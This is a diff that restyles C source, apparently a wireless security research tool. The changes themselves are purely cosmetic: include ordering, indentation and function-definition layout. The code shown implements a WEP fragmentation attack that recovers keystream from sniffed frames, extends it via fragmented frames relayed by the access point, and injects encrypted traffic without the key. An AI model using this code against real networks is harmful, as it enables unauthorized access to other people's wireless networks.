@@ -24,37 +24,33 @@
  * SUCH DAMAGE.
  */
 #include <sys/endian.h>
-#include <sys/time.h>
 #include <sys/select.h>
+#include <sys/time.h>
+
+#include <assert.h>
+#include <err.h>
+#include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <err.h>
 #include <unistd.h>
-#include <fcntl.h>
-#include <assert.h>
 #include <zlib.h>
-#include "w00t.h"
 
+#include "w00t.h"
 
 static char *known_pt_arp = "\xAA\xAA\x03\x00\x00\x00\x08\x06";
 static char *known_pt_ip = "\xAA\xAA\x03\x00\x00\x00\x08\x00";
 static int known_pt_len = 8;
 
-enum {
-	S_START = 0,
-	S_SEND_FRAG,
-	S_WAIT_ACK,
-	S_WAIT_RELAY
-};
+enum { S_START = 0, S_SEND_FRAG, S_WAIT_ACK, S_WAIT_RELAY };
 
 struct params {
 	int tx;
 	int rx;
-	
+
 	char mac[6];
 	char ap[6];
-	
+
 	char prga[2048];
 	int prga_len;
 	char iv[3];
@@ -78,17 +74,19 @@ struct params {
 	int tap;
 };
 
-void usage(char *p)
+void
+usage(char *p)
 {
 	printf("Usage: %s <opts>\n"
 	       "-h\thelp\n"
 	       "-b\t<bssid>\n"
-	       "-t\t<tap>\n"
-	       , p);
+	       "-t\t<tap>\n",
+	    p);
 	exit(0);
 }
 
-void load_prga(struct params *p)
+void
+load_prga(struct params *p)
 {
 	int fd;
 	int rd;
@@ -111,12 +109,13 @@ void load_prga(struct params *p)
 	if (rd == -1)
 		err(1, "read()");
 	p->prga_len = rd;
-	
+
 	printf("Loaded %d PRGA from %s\n", p->prga_len, p->fname);
 	close(fd);
 }
 
-void save_prga(struct params *p)
+void
+save_prga(struct params *p)
 {
 	int fd;
 	int rd;
@@ -145,36 +144,38 @@ void save_prga(struct params *p)
 	printf("Got %d bytes of PRGA\n", p->prga_len);
 }
 
-int is_arp(struct ieee80211_frame *wh, int len)
+int
+is_arp(struct ieee80211_frame *wh, int len)
 {
 	/* XXX */
 	if (len > (sizeof(*wh) + 4 + 4 + 39))
 		return 0;
 
-	return 1;	
+	return 1;
 }
 
-void get_prga(struct params *p)
+void
+get_prga(struct params *p)
 {
 	char buf[4096];
 	int rc;
-        struct ieee80211_frame *wh;
+	struct ieee80211_frame *wh;
 	char *bssid;
 	char *ptr;
 	char *known_pt;
 
-        rc = sniff(p->rx, buf, sizeof(buf));
-        if (rc == -1)
-                err(1, "sniff()");
+	rc = sniff(p->rx, buf, sizeof(buf));
+	if (rc == -1)
+		err(1, "sniff()");
 
-        wh = get_wifi(buf, &rc);
-        if (!wh)
-                return;
+	wh = get_wifi(buf, &rc);
+	if (!wh)
+		return;
 
 	if (!frame_type(wh, IEEE80211_FC0_TYPE_DATA,
-			IEEE80211_FC0_SUBTYPE_DATA))
+		IEEE80211_FC0_SUBTYPE_DATA))
 		return;
-	
+
 	if (is_arp(wh, rc))
 		known_pt = known_pt_arp;
 	else
@@ -193,7 +194,7 @@ void get_prga(struct params *p)
 		return;
 	}
 
-	ptr = (char*) (wh+1);
+	ptr = (char *)(wh + 1);
 	memcpy(p->iv, ptr, 3);
 	ptr += 4;
 	rc -= sizeof(wh) + 4;
@@ -209,7 +210,8 @@ void get_prga(struct params *p)
 	save_prga(p);
 }
 
-void start(struct params *p)
+void
+start(struct params *p)
 {
 	int len;
 
@@ -231,7 +233,8 @@ void start(struct params *p)
 	p->state = S_SEND_FRAG;
 }
 
-void send_packet(struct params *p)
+void
+send_packet(struct params *p)
 {
 	int rc;
 	struct ieee80211_frame *wh;
@@ -245,14 +248,15 @@ void send_packet(struct params *p)
 	}
 
 	p->data_try++;
-	wh = (struct ieee80211_frame*) p->packet;
+	wh = (struct ieee80211_frame *)p->packet;
 	wh->i_fc[1] |= IEEE80211_FC1_RETRY;
 
 	if (gettimeofday(&p->last, NULL) == -1)
 		err(1, "gettimeofday()");
 }
 
-void send_frag(struct params *p)
+void
+send_frag(struct params *p)
 {
 	struct ieee80211_frame *wh;
 	int dlen, rem;
@@ -264,7 +268,7 @@ void send_frag(struct params *p)
 	int i;
 
 	memset(p->packet, 0, sizeof(p->packet));
-	wh = (struct ieee80211_frame*) p->packet;
+	wh = (struct ieee80211_frame *)p->packet;
 
 	/* calculate how much data we need to copy */
 	dlen = p->prga_len - 4;
@@ -286,28 +290,28 @@ void send_frag(struct params *p)
 
 	wh->i_dur[0] = 0x69;
 	wh->i_dur[1] = 0x00;
-	
+
 	memcpy(wh->i_addr1, p->ap, 6);
 	memcpy(wh->i_addr2, p->mac, 6);
 	memset(wh->i_addr3, 0xff, 6);
 
-	seqp = (short*) wh->i_seq;
+	seqp = (short *)wh->i_seq;
 	*seqp = seqfn(p->seq, p->frag);
 	p->frag++;
 
 	/* IV & data */
-	ptr = (char*) (wh+1);
+	ptr = (char *)(wh + 1);
 	memcpy(ptr, p->iv, 3);
 	ptr += 4;
 	memcpy(ptr, p->data_ptr, dlen);
 
 	/* crc */
 	crc = crc32(crc, ptr, dlen);
-	pcrc = (uLong*) (ptr+dlen);
+	pcrc = (uLong *)(ptr + dlen);
 	*pcrc = crc;
 
 	/* wepify */
-	for (i = 0; i < dlen+4; i++)
+	for (i = 0; i < dlen + 4; i++)
 		ptr[i] = ptr[i] ^ p->prga[i];
 
 	/* prepare for next frag */
@@ -316,7 +320,7 @@ void send_frag(struct params *p)
 #if 0
 	printf("Sening %sfrag [%d/%d] [len=%d]\n", last ? "last " : "",
 	       p->seq, p->frag, dlen);
-#endif	
+#endif
 	if (last) {
 		p->data_ptr = p->data;
 		p->frag = 0;
@@ -328,11 +332,12 @@ void send_frag(struct params *p)
 	p->state = S_WAIT_ACK;
 }
 
-void wait_ack(struct params *p)
+void
+wait_ack(struct params *p)
 {
 	struct timeval now;
 	int el;
-	int tout = 10*1000;
+	int tout = 10 * 1000;
 	fd_set fds;
 	int rc;
 	char buf[4096];
@@ -347,37 +352,37 @@ void wait_ack(struct params *p)
 		if (p->data_try >= 3) {
 #if 0		
 			printf("Re-sending whole lot\n");
-#endif			
+#endif
 			p->state = S_START;
 			return;
 		}
 #if 0
 		printf("Re-sending frag\n");
-#endif		
+#endif
 		send_packet(p);
 		el = 0;
 	}
 
 	el = tout - el;
-	now.tv_sec = el/1000/1000;
-	now.tv_usec = el - now.tv_sec*1000*1000;
+	now.tv_sec = el / 1000 / 1000;
+	now.tv_usec = el - now.tv_sec * 1000 * 1000;
 
 	FD_ZERO(&fds);
 	FD_SET(p->rx, &fds);
-	if (select(p->rx+1, &fds, NULL, NULL, &now) == -1)
+	if (select(p->rx + 1, &fds, NULL, NULL, &now) == -1)
 		err(1, "select()");
 
 	if (!FD_ISSET(p->rx, &fds))
 		return;
 
 	/* grab ack */
-        rc = sniff(p->rx, buf, sizeof(buf));
-        if (rc == -1)
-                err(1, "sniff()");
+	rc = sniff(p->rx, buf, sizeof(buf));
+	if (rc == -1)
+		err(1, "sniff()");
 
-        wh = get_wifi(buf, &rc);
-        if (!wh)
-                return;
+	wh = get_wifi(buf, &rc);
+	if (!wh)
+		return;
 
 	if (!frame_type(wh, IEEE80211_FC0_TYPE_CTL, IEEE80211_FC0_SUBTYPE_ACK))
 		return;
@@ -390,14 +395,14 @@ void wait_ack(struct params *p)
 		p->state = S_WAIT_RELAY;
 		if (gettimeofday(&p->last, NULL) == -1)
 			err(1, "gettimeofday()");
-	}
-	else
+	} else
 		p->state = S_SEND_FRAG;
 }
 
-void wait_relay(struct params *p)
+void
+wait_relay(struct params *p)
 {
-	int tout = 20*1000;
+	int tout = 20 * 1000;
 	struct timeval now;
 	int el;
 	fd_set fds;
@@ -415,33 +420,33 @@ void wait_relay(struct params *p)
 	if (el >= tout) {
 #if 0	
 		printf("No relay\n");
-#endif		
+#endif
 		p->state = S_START;
 		return;
 	}
 	el = tout - el;
-	now.tv_sec = el/1000/1000;
-	now.tv_usec = el - now.tv_sec*1000*1000;
+	now.tv_sec = el / 1000 / 1000;
+	now.tv_usec = el - now.tv_sec * 1000 * 1000;
 
 	FD_ZERO(&fds);
 	FD_SET(p->rx, &fds);
-	if (select(p->rx+1, &fds, NULL, NULL, &now) == -1)
+	if (select(p->rx + 1, &fds, NULL, NULL, &now) == -1)
 		err(1, "select()");
-	
+
 	if (!FD_ISSET(p->rx, &fds))
 		return;
 
 	/* get relay */
-        rc = sniff(p->rx, buf, sizeof(buf));
-        if (rc == -1)
-                err(1, "sniff()");
+	rc = sniff(p->rx, buf, sizeof(buf));
+	if (rc == -1)
+		err(1, "sniff()");
 
-        wh = get_wifi(buf, &rc);
-        if (!wh)
-                return;
+	wh = get_wifi(buf, &rc);
+	if (!wh)
+		return;
 
 	if (!frame_type(wh, IEEE80211_FC0_TYPE_DATA,
-			IEEE80211_FC0_SUBTYPE_DATA))
+		IEEE80211_FC0_SUBTYPE_DATA))
 		return;
 
 	if (memcmp(wh->i_addr2, p->ap, 6) != 0)
@@ -454,28 +459,29 @@ void wait_relay(struct params *p)
 		return;
 
 	/* lends different due to padding? */
-	if ( (rc - sizeof(*wh) - 8) != p->data_len)
+	if ((rc - sizeof(*wh) - 8) != p->data_len)
 		return;
-	
+
 	/* grab new PRGA */
 	assert(p->data_len >= p->prga_len);
-	ptr = (char*) (wh+1);
+	ptr = (char *)(wh + 1);
 	memcpy(p->iv, ptr, 3);
 	ptr += 4;
 
 	crc = crc32(crc, p->data, p->data_len);
-	pcrc = (uLong*) &p->data[p->data_len]; /* XXX overflow ph33r */
+	pcrc = (uLong *)&p->data[p->data_len]; /* XXX overflow ph33r */
 	*pcrc = crc;
 
-	for (rc = 0; rc < p->data_len+4; rc++)
+	for (rc = 0; rc < p->data_len + 4; rc++)
 		p->prga[rc] = p->data[rc] ^ ptr[rc];
 
-	p->prga_len = p->data_len+4;
+	p->prga_len = p->data_len + 4;
 	p->state = S_START;
 	save_prga(p);
 }
 
-void get_more_prga(struct params *p)
+void
+get_more_prga(struct params *p)
 {
 	switch (p->state) {
 	case S_START:
@@ -501,7 +507,8 @@ void get_more_prga(struct params *p)
 	}
 }
 
-void read_tap(struct params *p)
+void
+read_tap(struct params *p)
 {
 	int offset;
 	char *ptr;
@@ -522,7 +529,7 @@ void read_tap(struct params *p)
 		err(1, "read()");
 
 	memcpy(dst, ptr, sizeof(dst));
-	wh = (struct ieee80211_frame*) p->packet;
+	wh = (struct ieee80211_frame *)p->packet;
 	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
 	wh->i_fc[0] |= IEEE80211_FC0_SUBTYPE_DATA;
 	wh->i_fc[1] |= IEEE80211_FC1_PROTECTED;
@@ -534,20 +541,20 @@ void read_tap(struct params *p)
 	memcpy(wh->i_addr2, p->mac, 6);
 	memcpy(wh->i_addr3, dst, 6);
 
-	seq = (short*) wh->i_seq;
+	seq = (short *)wh->i_seq;
 	*seq = seqfn(p->seq++, 0);
 
 	/* data */
-	ptr = (char*) (wh+1);
+	ptr = (char *)(wh + 1);
 	memcpy(ptr, p->iv, 3);
 	ptr += 3;
 	*ptr++ = 0;
 	memcpy(ptr, "\xAA\xAA\x03\x00\x00\x00", 6);
 	rc -= 14;
 	rc += 8;
-	
+
 	crc = crc32(crc, ptr, rc);
-	pcrc = (uLong*) (ptr+rc);
+	pcrc = (uLong *)(ptr + rc);
 	*pcrc = crc;
 
 	rc += 4;
@@ -565,7 +572,8 @@ void read_tap(struct params *p)
 }
 
 /* XXX */
-void wait_tap_ack(struct params *p)
+void
+wait_tap_ack(struct params *p)
 {
 	p->data_try = 0;
 	p->frag = 1;
@@ -576,16 +584,17 @@ void wait_tap_ack(struct params *p)
 		printf("Got ACK\n");
 #endif
 		p->state = S_START;
-	}	
+	}
 }
 
-void transmit(struct params *p)
+void
+transmit(struct params *p)
 {
 	switch (p->state) {
 	case S_START:
 		read_tap(p);
 		break;
-	
+
 	case S_WAIT_ACK:
 		wait_tap_ack(p);
 		break;
@@ -597,7 +606,8 @@ void transmit(struct params *p)
 	}
 }
 
-int main(int argc, char *argv[])
+int
+main(int argc, char *argv[])
 {
 	struct params p;
 	char *iface = "wlan0";
